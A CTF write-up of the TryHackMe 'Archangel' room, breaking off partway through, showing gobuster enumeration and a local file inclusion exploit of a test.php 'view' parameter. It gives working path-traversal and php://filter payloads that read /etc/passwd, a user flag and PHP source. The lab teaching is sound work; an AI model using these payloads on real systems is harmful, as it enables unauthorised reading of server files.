---
title: "TryHackMe: Archangel"
author: cilgin
date: 2025-06-18 00:38:49 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-18-TryHackMe-Archangel/Archangel.png
---

# Enumeration

## Nmap Scan

I start with exporting the target machine IP adress as a enviroment variable:

```bash
export IP=10.10.58.58
```

And running `nmap` scan on the target:

```bash

```

## Enumerating The Website

First thing that I see is this:
![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo1.png){: width="972" height="589" }

So we need to add this domain to the `/etc/hosts`{: .filepath}.

And If we curl the website:

```bash
curl http://mafialive.thm
<h1>UNDER DEVELOPMENT</h1>
thm{*************************}
```

We find the first flag.

## Fuzzing the path's

I run `gobuster`:

```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.58.58/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,py,css,txt,md,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/flags                (Status: 301) [Size: 310] [--> http://10.10.58.58/flags/]
/images               (Status: 301) [Size: 311] [--> http://10.10.58.58/images/]
/index.html           (Status: 200) [Size: 19188]
/index.html           (Status: 200) [Size: 19188]
/layout               (Status: 301) [Size: 311] [--> http://10.10.58.58/layout/]
/licence.txt          (Status: 200) [Size: 5014]
/pages                (Status: 301) [Size: 310] [--> http://10.10.58.58/pages/]
/server-status        (Status: 403) [Size: 276]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

And there is `/flags` path we can use. I think I found the 2'nd flag:
![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo2.png){: width="972" height="589" }

Of course I'm not. Site redirects me to rickroll.

![Desktop View](/assets/img/2025-06-18-TryHackMe-Archangel/photo3.png){: width="972" height="589" }

Time for enumerating <mafialive.thm>:

```bash
❯ gobuster dir -w common.txt -u http://mafialive.thm/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mafialive.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              py,css,txt,md,js,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 59]
/index.html           (Status: 200) [Size: 59]
/robots.txt           (Status: 200) [Size: 34]
/robots.txt           (Status: 200) [Size: 34]
/server-status        (Status: 403) [Size: 278]
/test.php             (Status: 200) [Size: 286]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

`/test.php` look promising.

```bash
❯ curl http://mafialive.thm/test.php
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
            </div>
</body>

</html>
```

```bash
❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php"
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        Control is an illusion    </div>
</body>
```

Look's like we can use this file to `cat` out some files.

```bash
❯ curl "http://mafialive.thm/test.php?view=/etc/passwd"
<!DOCTYPE HTML>
<html>
<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        Sorry, Thats not allowed    </div>
</body>
</html>
```

Look's like we can't. Or can we? We can use Local File Inclusion (LFI) technique.

```bash
❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd"

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
    </div>
</body>

</html>
```

And we can try to read the flag:

```bash
❯ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//home/archangel/user.txt"

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        thm{lf1_t0_rc3_1s_tr1cky}
    </div>
</body>

</html>
```

We can also try to read the vulnerable files codes:

```bash
❯ curl "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php"

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>

    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==    </div>
</body>

</html>
```

```bash
❯ echo -e "PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==" | base64 -d
<?php echo 'Control is an illusion'; ?>
```

This looks normal. Let's try `/test.php`
